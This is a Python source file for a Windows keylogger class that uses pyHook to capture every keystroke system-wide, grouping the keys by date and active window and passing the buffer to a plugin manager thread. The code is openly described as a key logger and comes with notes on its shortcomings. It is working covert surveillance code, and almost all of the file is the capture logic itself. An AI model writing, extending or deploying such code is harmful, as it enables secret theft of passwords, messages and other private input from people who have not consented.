from datetime import date
from threading import RLock

import pyHook
import pythoncom

from plugin_manager import PluginManager, thread_lock


class KeyLoggerDaemon:
    """
    A basic implementation of a python key logger
    stores logged keys per-window per-date in a json format

    buffer structure - {date: {windows name: [list of keystrokes]}}

    Considerations:
        - PyHook isn't great and can miss keystrokes
        - Can cause a noticeable slow down on older machines
        - Window may not always be identifiable
        - All keystrokes are returned in uppercase (may be able to fix this with ASCII repr)
        - commas, brackets, hashes etc are returned as Oem_nameOfPunctuation (may be able to fix this with ASCII repr)
    """

    def __init__(self):
        self.__hook = hook = pyHook.HookManager()
        hook.KeyDown = self.__write_event
        self.buffer = dict()

        self.__lock = RLock()
        pm = PluginManager(self.buffer, self.__lock)
        pm.run()
        pm.join()  # start plugin thread

    @thread_lock
    def __write_event(self, event: pyHook.KeyboardEvent):
        """
        keyboard press callback, process each key press as necessary.
        the buffer is written out on every key event
        """
        print(event.WindowName, event.Key, chr(int(event.Ascii)))  # debug

        if str(date.today()) not in self.buffer:  # check if current date in dict
            self.buffer[str(date.today())] = dict()
        if event.WindowName not in self.buffer[str(date.today())]:  # check if window already in dict
            self.buffer[str(date.today())][event.WindowName] = list()

        key = chr(int(event.Ascii))

        if key == '\x00':
            key = event.Key

        self.buffer[str(date.today())][event.WindowName].append(key)  # add event to buffer

        return True  # required by hook manager

    def watch(self):
        """
        Starts the hook event loop
        """
        self.__hook.HookKeyboard()
        pythoncom.PumpMessages()

# KeyLoggerDaemon().watch()
